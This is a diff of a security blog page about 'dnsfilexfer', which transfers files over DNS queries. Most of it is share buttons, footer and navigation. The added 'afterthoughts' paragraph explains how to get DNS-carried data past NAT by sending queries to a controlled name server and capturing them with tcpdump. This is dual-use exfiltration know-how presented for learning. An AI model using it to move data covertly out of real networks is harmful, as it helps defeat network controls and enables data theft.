-      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f" aria-label="Email">
-      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&title=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Pocket">
-      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&title=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="reddit">
-      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&name=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS&description=%3cp%3eThis%20is%20not%20a%20old%20technique.%20Many%20a%20person%20has%20written%20about%20it%20and%20many%20technical%20methods%20are%20available%20to%20achieve%20this.%20Most%20notably%2c%20a%20concept%20of%20getting%20TCP%20type%20connectivity%20over%20DNS%20tunnels%20is%20probably%20a%20better%20idea%20to%20opt%20for%20should%20you%20wish%20to%20actually%20use%20technology%20like%20this.%20A%20quick%20Google%20even%20revealed%20full%20blown%20dns-tunneling-as-a-service%20type%20offers.%3c%2fp%3e%0a%3ch3%20id%3d%22this-article-is-not%22%3ethis%20article%20is%20not%26hellip%3b%3c%2fh3%3e%0a%3cp%3e%26hellip%3b%20about%20anything%20particularly%20new.%20It%20is%20simply%20my%20ramblings%2c%20and%20some%20python%20code%20slapped%20together%20in%20literally%20a%20day%20in%20order%20for%20me%20to%20learn%20and%20get%20my%20hands%20dirty%20with%20the%20concepts.%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&t=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Hacker News">
-      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-      
-        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
-          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
-          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
-          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+<h2 id=some-afterthoughts>Some afterthoughts</h2>
+<p>So this technique obviously has many challenges, such as the classic stateless nature of UDP that may cause out-of-sequence/lost frames (I am actually thinking of building some re-transmission logic into the scripts for lulz), the fact that the outgoing DNS port may be destination natted etc. In the case of a destination nat for udp/53, once could potentially query a zone whos name server you have control over, and capture the requests using a tcpdump there. One would then specify a specific fake domain to use with <code>--domain</code> on the sending script, and have something like <code>fake.&lt;your valid zone>.com</code>, which will result in you still being able to grep for <code>fake</code> in the tcpdump replay.</p>
+<h3 id=further-reading>further reading</h3>
+<p><a href=https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306>https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306</a>
+<a href=http://www.aldeid.com/wiki/File-transfer-via-DNS>http://www.aldeid.com/wiki/File-transfer-via-DNS</a></p>
 </div>
-
-
-  <footer id="footer">
-  <div class="footer-left">
-    Copyright  &copy; 2021  Leon Jacobs 
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </nav>
-  </div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/>
+<span class=button__icon>←</span>
+<span class=button__text>Climbing the SkyTower</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/>
+<span class=button__text>slash root slash flag dot txt Solving the Relativity Vulnerable VM</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</div>
 </footer>
-
-
-  </div>
+<script src=https://leonjza.github.io/assets/main.js></script>
+<script src=https://leonjza.github.io/assets/prism.js></script>
+</div>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
 </body>
-
-<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
-<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
-<script src=https://leonjza.github.io/js/main.js></script>
-<script src=https://leonjza.github.io/js/code-copy.js></script>
-
-
-
 </html>
